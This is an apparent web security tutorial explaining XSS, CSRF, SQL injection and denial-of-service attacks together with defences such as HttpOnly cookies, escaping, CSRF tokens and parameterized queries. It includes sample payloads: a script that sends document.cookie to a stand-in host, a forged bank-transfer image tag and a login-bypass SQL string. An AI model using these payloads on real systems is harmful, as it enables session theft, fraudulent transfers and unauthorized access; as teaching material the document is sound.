## 1. Cross-site scripting attack

### Concept

Cross-Site Scripting (XSS) attacks can inject code into web pages that users browse. This code includes HTML and JavaScript.

### Attack principle

For example, there is a forum website where an attacker can post the following content:

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

The content may then be rendered into the following form:

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

Another user browsing a page containing this content will jump to domain.com and carry the cookie of the current scope. If this forum website uses cookies to manage user login status, then the attacker can use this cookie to log in to the attacked account.

### Hazard

- Steal users' cookies
- Forge fake input forms to defraud personal information
- Display fake articles or pictures

### Precautionary measures

#### 1. Set Cookie to HttpOnly

Setting HttpOnly cookies can prevent JavaScript scripts from being called, and user cookie information cannot be obtained through document.cookie.

#### 2. Filter special characters

For example, escape `<` to `&lt;` and escape `>` to `&gt;` to prevent HTML and Jascript code from running.

The rich text editor allows users to enter HTML code, so characters such as `<` cannot be simply filtered, which greatly increases the possibility of XSS attacks.

Rich text editors usually use XSS filters to prevent XSS attacks by defining some tag whitelists or blacklists to prevent the entry of offensive HTML code.

In the following example, tags such as form and script are escaped, while tags such as h and p will remain.

```html
<h1 id="title">XSS Demo</h1>

<p>123</p>

<form>
  <input type="text" name="q" value="test">
</form>

<pre>hello</pre>

<script type="text/javascript">
alert(/xss/);
</script>
```

```html
<h1>XSS Demo</h1>

<p>123</p>

&lt;form&gt;
  &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt;

<pre>hello</pre>

&lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt;
```

## 2. Cross-site request forgery

### Concept

Cross-site request forgery (CSRF) is an attacker who uses some technical means to deceive the user's browser to visit a website that he has authenticated and perform some operations (such as sending emails, sending messages, and even property operations such as transferring money and purchasing goods). Since the browser has been authenticated, the visited website will regard it as a real user operation and execute it.

X
SS takes advantage of the user's trust in the specified website, and CSRF takes advantage of the website's trust in the user's browser.

### Attack principle

Suppose a bank uses the following URL to perform transfer operations:

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName.
```

Then, a malicious attacker could place code like the following on another website:

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">.
```

If a user named Alice visited a malicious site, and she had just visited the bank shortly before and her login information had not expired, she would lose $1,000.

This kind of malicious URL can take many forms and be hidden in many places on the web page. Additionally, the attacker does not need to control the website hosting the malicious URL. For example, he can hide this address in forums, blogs, or any other website with user-generated content. This means that if there are no appropriate defense measures on the server side, users are still at risk of being attacked even when they visit familiar and trusted websites.

As can be seen from the example, the attacker cannot directly obtain the user's account control through CSRF attack, nor can he directly steal any user information. What they can do is trick the user's browser into performing actions on the user's behalf.

### Precautionary measures

#### 1. Check the Referer header field

The Referer header field is located in the HTTP packet and is used to identify the address of the request source. Checking this header field and requiring the request source address to be under the same domain name can greatly prevent CSRF attacks.

This method is simple and easy to implement, with low workload. It only needs to add one step of verification at key access points. But this approach also has its limitations, as it completely relies on the browser to send the correct Referer field. Although the HTTP protocol has clear regulations on the content of this field, it cannot guarantee the specific implementation of the visiting browser, nor can it guarantee that the browser will not have security vulnerabilities affecting this field. And there is also the possibility of attackers attacking some browsers and tampering with their Referer field.

#### 2. Add verification Token

When requesting access to sensitive data, the user's browser is required to provide data as verification that is not stored in cookies and cannot be forged by attackers. For example, the server generates a random number and appends it to the form, and asks the client to return this random number.

#### 3. Enter the verification code

Because CSRF attacks occur without the user's awareness, requiring the user to enter a verification code lets the user know what they are doing.

## 3. SQL injection attack

### Concept

The database on the server runs illegal SQL statements, mainly through splicing.

### Attack principle

For example, the SQL qu
ery code for website login verification is:

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

If you fill in the following:

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

Then the SQL query string is:

```sql
s
trSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

At this time, the following query can be executed without verification:

```sql
strSQL = "SELECT * FROM users;"
```

### Precautionary measures

#### 1. Use parameterized queries

PreparedStatement in Java is a pre-compiled SQL statement that can be passed in appropriate parameters and executed multiple times. Since there is no splicing process, SQL injection can be prevented from occurring.

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

#### 2. Single quote conversion

Convert the single quotes in the passed parameters into two consecutive single quotes. Magic quote in PHP can complete this function.

## 4. Denial of Service Attack

Denial-of-service attack (DoS), also known as flood attack, aims to exhaust the network or system resources of the target computer and temporarily interrupt or stop the service, making it inaccessible to normal users.

Distributed denial-of-service attack (DDoS) refers to an attacker using two or more compromised computers as "zombie" to launch a "denial of service" attack on a specific target.
